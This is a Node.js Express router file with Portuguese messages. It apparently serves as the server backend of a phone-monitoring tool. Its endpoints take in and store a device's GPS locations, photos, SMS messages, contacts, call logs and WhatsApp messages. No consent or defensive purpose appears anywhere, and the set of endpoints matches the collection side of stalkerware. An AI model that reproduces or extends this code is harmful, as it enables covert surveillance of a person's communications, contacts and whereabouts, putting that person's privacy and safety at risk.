const router = require('express').Router();
const auth   = require('../middleware/auth');
const Device = require('../models/Device');
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

// Dispositivos
router.post('/:deviceId/location', auth, async (req, res) => {
  const { latitude, longitude } = req.body;
  await Device.findByIdAndUpdate(req.params.deviceId, {
    $push: { locations: { latitude, longitude, at: new Date() } }
  });
  res.json({ msg: 'Localização recebida' });
});

router.post('/:deviceId/upload-photo', auth, upload.single('photo'), async (req, res) => {
  const d = await Device.findById(req.params.deviceId);
  d.photos.push({ filename: req.file.filename, path: req.file.path, uploaded: new Date() });
  await d.save();
  res.json({ msg: 'Foto recebida', file: req.file });
});

router.post('/:deviceId/upload-sms', auth, async (req, res) => {
  const { sender, body, timestamp } = req.body;
  const d = await Device.findById(req.params.deviceId);
  d.sms.push({ sender, body, timestamp: new Date(Number(timestamp)) });
  await d.save();
  res.json({ msg: 'SMS recebida' });
});

router.post('/:deviceId/upload-contacts', auth, async (req, res) => {
  const arr = req.body;
  const d = await Device.findById(req.params.deviceId);
  d.contacts = arr;
  await d.save();
  res.json({ msg: 'Contacts recebidos' });
});

router.post('/:deviceId/upload-calllog', auth, async (req, res) => {
  const arr = req.body;
  const d = await Device.findById(req.params.deviceId);
  d.calllog = arr.map(c => ({
    number: c.number, type: c.type,
    date: new Date(c.date), duration: c.duration
  }));
  await d.save();
  res.json({ msg: 'CallLog recebidos' });
});

router.post('/:deviceId/upload-whatsapp', auth, async (req, res) => {
  const { sender, message, timestamp } = req.body;
  const d = await Device.findById(req.params.deviceId);
  d.whatsapp.push({ sender, message, timestamp: new Date(Number(timestamp)) });
  await d.save();
  res.json({ msg: 'WhatsApp recebido' });
});

module.exports = router;
